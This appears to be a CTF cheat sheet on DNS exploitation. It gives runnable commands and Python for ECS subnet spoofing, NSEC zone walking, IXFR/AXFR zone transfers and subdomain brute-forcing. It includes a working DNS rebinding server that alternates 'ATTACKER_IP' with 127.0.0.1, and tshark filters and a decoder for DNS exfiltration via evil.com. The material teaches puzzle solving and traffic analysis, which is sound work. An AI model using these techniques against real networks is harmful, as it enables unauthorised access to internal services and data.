# CTF Misc - DNS Exploitation Techniques

## EDNS Client Subnet (ECS) Spoofing
**Pattern (DragoNflieS, Nullcon 2026):** DNS server returns different records based on client IP. Spoof source using ECS option.

```bash
# dig with ECS option
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)  # Internal network subnet
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**Key insight:** Try leet-speak subnets like `10.13.37.0/24` (1337), common internal ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

## DNSSEC NSEC Walking
**Pattern (DiNoS, Nullcon 2026):** NSEC records in DNSSEC zones reveal all domain names by chaining to the next name.

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    """Walk NSEC chain to enumerate entire zone."""
    current = base_domain
    visited = set()
    records = []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        # Extract TXT records
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        # Follow NSEC chain
        m = re.search(r'NSEC\s+(\S+)', out)
        if m:
            current = m.group(1).rstrip('.')
        else:
            break
    return records
```

## Incremental Zone Transfer (IXFR)
**Pattern (Zoney, Nullcon 2026):** When AXFR is blocked, IXFR from old serial reveals zone update history including deleted records.

```bash
# AXFR blocked? Try IXFR from serial 0
dig @server -p 5054 flag.example.com IXFR=0
# Look for historical TXT records in the diff output
```

**IXFR output format:** The diff shows pairs of SOA records bracketing additions/deletions. Records between the old SOA and new SOA were removed; records after new SOA were added. Deleted TXT records often contain flag fragments.

---

## DNS Rebinding

**Pattern:** Bypass same-origin or IP-based access controls by making a DNS name resolve to different IPs over time.

**How it works:**
1. Attacker controls DNS for `evil.com` with very low TTL (e.g., 1 second)
2. First resolution: `evil.com` -> attacker's IP (serves malicious JS)
3. Second resolution: `evil.com` -> `127.0.0.1` (or internal IP)
4. Browser's same-origin policy allows JS on `evil.com` to access the new IP

```python
# Simple DNS rebinding server (Python + dnslib)
from dnslib import DNSRecord, RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self):
        self.count = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.count[qname] = self.count.get(qname, 0) + 1
        reply = request.reply()

        if self.count[qname] % 2 == 1:
            reply.add_answer(RR(qname, rdata=A("ATTACKER_IP"), ttl=1))
        else:
            reply.add_answer(RR(qname, rdata=A("127.0.0.1"), ttl=1))
        return reply
```

**Tools:** [rbndr.us](http://rbndr.us/) for quick rebinding without custom DNS, [singularity](https://github.com/nccgroup/singularity) for automated attacks.

---

## DNS Tunneling / Exfiltration

**Pattern:** Data exfiltrated via DNS queries (subdomains) or responses (TXT records).

**Detection in PCAPs:**
```bash
# Extract DNS queries from pcap
tshark -r capture.pcap -Y "dns.qry.type == 1" \
    -T fields -e dns.qry.name | sort -u

# Look for encoded subdomains (hex, base32, base64url)
tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" \
    -T fields -e dns.qry.name
```

**Decoding exfiltrated data:**
```python
import base64

# Subdomain-based exfil: data.chunk1.evil.com, data.chunk2.evil.com
queries = [...]  # extracted DNS query names
chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
decoded = base64.b32decode(''.join(chunks).upper() + '====')
print(decoded)
```

**DNS-based C2 in PCAPs:**
```bash
tshark -r capture.pcap -Y "dns.qry.type == 16" \
    -T fields -e dns.qry.name -e dns.txt
```

---

## DNS Enumeration Quick Reference

```bash
# Standard zone transfer attempt
dig @ns.target.com target.com AXFR

# Brute-force subdomains
for sub in $(cat wordlist.txt); do
    dig +short "$sub.target.com" && echo "$sub"
done

# Reverse DNS sweep
for i in $(seq 1 254); do
    dig +short -x 10.0.0.$i
done

# Check for wildcard DNS
dig randomnonexistent.target.com
```
